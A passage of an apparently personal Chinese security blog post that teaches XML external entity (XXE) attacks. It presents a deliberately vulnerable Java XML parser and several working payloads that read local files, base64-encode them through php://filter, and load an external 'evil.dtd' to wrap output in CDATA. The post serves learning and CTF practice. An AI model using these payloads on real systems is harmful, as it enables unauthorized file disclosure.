@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            XXE整理 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        XXE整理
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-11-18 12:47:16</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Tue Nov 18 2025 12:48:41 GMT+0800">2025-11-18 12:48:41</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>6.7k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>34 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一开始学web基础漏洞时，就没好好看过xxe，因为感觉考的少。一天，killer师傅在公众号发了个xxe小挑战（<a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/kUlXxJxKO-70QMNCQvLHZA%EF%BC%89%EF%BC%8C%E6%88%91%E5%B0%B1%E6%83%B3%E5%80%9F%E6%AD%A4%E6%9C%BA%E4%BC%9A%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8Bxxe%E3%80%82" >https://mp.weixin.qq.com/s/kUlXxJxKO-70QMNCQvLHZA），我就想借此机会学习一下xxe。<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="xxe简介"><a href="#xxe简介" class="headerlink" title="xxe简介"></a>xxe简介</h1><h2 id="初见"><a href="#初见" class="headerlink" title="初见"></a>初见</h2><p>当xml允许引用外部实体时，可能会造成文件读取或端口探测的效果。所以，可以说xxe相当于任意文件读+SSRF，只不过这里读文件的条件其实比较苛刻。</p>
+<p>来看一个最简单的payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span>[</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY <span class="keyword">read</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;read;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个payload能够读取win.ini，并作为通用实体read的值。这样就可以在xml正文里通过&read;的方法进行引用，从而将数据注入xml正文。如果解析后有回显的话，我们就能够读到数据。</p>
+<p>这是漏洞函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">docBuilder</span><span class="params">(String xml)</span> <span class="keyword">throws</span> ParserConfigurationException, IOException, SAXException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayInputStream(xml.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="type">DocumentBuilderFactory</span> <span class="variable">factory</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">        <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> factory.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 漏洞：未禁用外部实体</span></span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputStream);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">NodeList</span> <span class="variable">rootNodeList</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">rootNode</span> <span class="operator">=</span> rootNodeList.item(i);</span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">child</span> <span class="operator">=</span> rootNode.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> child.item(j);</span><br><span class="line">                buf.append(node.getNodeName() + <span class="string">&quot;: &quot;</span> + node.getTextContent() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(buf.toString());</span><br><span class="line"><span class="comment">//        System.out.println(doc);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Document parsed successfully&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入刚刚的payload，成功读取到内容：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763042481576-25852cfd-b855-4610-9a6a-b7f141105135.png"  alt="img"></p>
+<h2 id="各种语言支持的协议"><a href="#各种语言支持的协议" class="headerlink" title="各种语言支持的协议"></a>各种语言支持的协议</h2><p>上面通过file协议引用外部文件，xml的dtd(document type definition)中还支持很多其他伪协议，具体怎么用在下面讲。</p>
+<p>PHP：file&#x2F;http&#x2F;ftp&#x2F;php&#x2F;compress.zlib&#x2F;compress.bzip2&#x2F;data&#x2F;glob&#x2F;phar<br>PHP扩展openssl：https&#x2F;ftps<br>PHP扩展zip：zip<br>PHP扩展ssh2：ssh2.shell&#x2F;ssh2.exec&#x2F;ssh2.tunnel&#x2F;ssh2.sftp&#x2F;ssh2.scp<br>PHP扩展rar：rar<br>PHP扩展oggvorbis：ogg<br>PHP扩展expect ：expect<br>Java：http&#x2F;https&#x2F;ftp&#x2F;file&#x2F;jar&#x2F;netdoc&#x2F;mailto&#x2F;gopher(仅限低版本)<br>.NET：file&#x2F;http&#x2F;https&#x2F;ftp</p>
+<h1 id="各种打法"><a href="#各种打法" class="headerlink" title="各种打法"></a>各种打法</h1><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>注意，<?xml version="1.0"?>前面不能有任何字符，换行也不行，不然就会报错：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763104261381-ab5ff3a1-2d3d-40af-ae18-e9839abb228a.png"  alt="img"></p>
+<p>复制的时候注意点</p>
+<h2 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h2><p>一般用：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span>[</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY <span class="keyword">read</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;read;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>跟上面讲的一样。</p>
+<p>读目录就把最后的文件名去掉</p>
+<h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>但是要注意，有一些特殊字符不能回显。</p>
+<p>在xml主体部分中 !%&gt;;可以正常回显：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763082454462-f9ab4280-8218-4cc9-bb1e-eec57b3a220a.png"  alt="img"></p>
+<p>&amp;&lt;不能回显：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763082542147-7846bc90-4514-46c2-a581-bccbdf2499bc.png"  alt="img"></p>
+<p>除非是正确的xml语法，比如<a>aaa</a>，这样虽然不报错，但是只能回显标签内部的内容：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763082696755-007978d2-e929-44a3-8f64-8d1d607b3d2d.png"  alt="img"></p>
+<p>通过上面的例子，可以发现其本质就是是否符合xml语法。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span>[</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY <span class="keyword">read</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;read;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通用实体在DTD部分声明，在XML文档主体中被按顺序解析，每次解析完都会检查一遍语法。这就是为什么不能出现单个&lt;的原因。</p>
+<p>但是在php中，可以通过php:&#x2F;&#x2F;filter的方式对文件进行编码，然后带出：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span>[</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY <span class="keyword">read</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;read;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="CDATA带出特殊符号"><a href="#CDATA带出特殊符号" class="headerlink" title="CDATA带出特殊符号"></a>CDATA带出特殊符号</h3><p>CDATA能够将包裹的内容作为纯文本，不被xml解析器解析。如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">example</span>&gt;</span></span><br><span class="line">  &lt;![CDATA[&lt;b&gt;This is a bold text&lt;/b&gt;]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">example</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="失败1"><a href="#失败1" class="headerlink" title="失败1"></a>失败1</h4><p>下面是一个失败的payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/target.txt&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;start;</span><span class="symbol">&amp;goodies;</span><span class="symbol">&amp;end;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>会报错：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763104628347-d9af040b-2f78-475d-ad30-6ccc3e1588dd.png"  alt="img"></p>
+<p>看起来明明没问题，为什么会报错？</p>
+<p>这是因为通用实体的展开和xml主体的语法检查是交替进行的。也就是说，这里会先展开&start; 于是xml主体变成：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&lt;![CDATA[&amp;goodies;&amp;end;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这时，xml进行一次语法检查，发现&lt;&gt;没有闭合，于是抛出报错。</p>
+<p>下面是AI问答的关键部分：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763104765206-f1c8c510-c495-4462-a07b-ffb0610c4868.png"  alt="img"></p>
+<p>所以我们得想办法在DTD中就把CDATA完整拼接好。</p>
+<h4 id="失败2"><a href="#失败2" class="headerlink" title="失败2"></a>失败2</h4><p>下面又是一个失败的payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/target.txt&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">cdata</span> <span class="string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;cdata;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>报错：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763105302672-d86878af-c076-430f-9c49-3ab6a0194007.png"  alt="img"></p>
+<p>这里规定，通用实体和参数实体的定义中，都不能对参数实体进行引用。</p>
+<p>但是，外部dtd中的情况就不同：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:7777/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;cdata;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/target.txt&quot;</span>&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">cdata</span> <span class="string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>外部dtd是允许在实体定义中引用另一个实体的，且在引用前会进行展开。</p>
+<p>通过CDATA，我们得以显示&lt;，但是单独的&amp;还是会报错：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763106491588-67c5e461-378e-4622-8a0c-3937998a2783.png"  alt="img"></p>
+<p>这是因为外部dtd中，使用file进行了一次dtd引用。解析器肯定是把引用的文件当作xml去进行语法检查，所以必须以&a; 的形式出现才行，而不能是单独的&amp;。实际上，任何实体中都不能出现单独的&amp;：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763106730199-e64be1e5-071a-4bec-a853-7f0335e85ec9.png"  alt="img"></p>
+<p>在这里添加&amp;也会导致直接报错，外部dtd也是：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763106805856-a7c95c5b-fc8a-4db3-a280-367924753136.png"  alt="img"></p>
+<p>但我们可以通过手动闭合的方式实现。比如target.txt的内容是&amp;，那外部dtd可以写成：</p>
